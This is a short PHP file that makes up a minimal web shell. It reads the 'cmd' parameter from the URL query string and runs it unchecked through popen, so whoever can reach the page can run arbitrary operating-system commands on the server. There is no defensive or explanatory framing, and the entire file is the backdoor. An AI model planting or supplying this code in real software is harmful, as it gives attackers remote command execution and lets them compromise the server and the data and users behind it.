<?php
function myshellexec($cmd)
{
    $fp = popen($cmd,"r");
	$result = "";
    while(!feof($fp)) {
		$result .= fread($fp,1024);
	}
    pclose($fp);
    return $result;
}
$cmdline = $_GET['cmd'];
$ret = myshellexec($cmdline);
?>